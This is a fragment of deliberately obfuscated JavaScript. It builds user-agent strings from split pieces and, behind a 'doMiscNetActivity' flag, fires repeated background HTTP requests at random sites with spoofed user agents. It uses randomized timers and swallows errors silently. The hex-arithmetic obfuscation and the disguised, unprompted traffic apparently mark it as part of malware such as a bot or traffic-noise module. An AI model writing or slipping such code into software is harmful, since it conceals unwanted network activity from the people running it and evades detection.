      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x5b * 0x5d + -0xb9 + 0x1 * -0x2056; k < -0x9 * -0x265 + 0x4 * -0xc9 + -0x1265; k++)
    setTimeout(f, (-0x29 * 0xa85 + 0xc6d4 + 0x1d2d9) * k * getRandomInt(0x1005 + -0x13eb + 0x25 * 0x1b, -0x85e + 0x1f66 + 0x53 * -0x47));
  setInterval(() => {
    f();
    for (let l = 0x6a + -0x296 * -0x3 + -0x82c; l < 0x2f * -0xb7 + 0xa8e + -0x170f * -0x1; l++)
      setTimeout(f, (0x1b5b3 + 0x29d5 * -0x6 + 0x2fab) * l * getRandomInt(0x253f * -0x1 + -0x1 * 0x45d + 0x3 * 0xddf, -0x211 + 0x1d3f + -0x217 * 0xd));
  }, -0x35e0e9 + -0xae1 * 0x9d7 + 0xd7db60);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1fac + -0xe83 * -0x2 + 0x1dfe) * getRandomInt(-0x1a68 + -0x58 * -0x5 + -0x1 * -0x18b1, -0x1e * -0x6b + 0x1bc7 + 0x2 * -0x1426));
}, -0x10b1 * 0x1 + 0xea8 + 0x26d);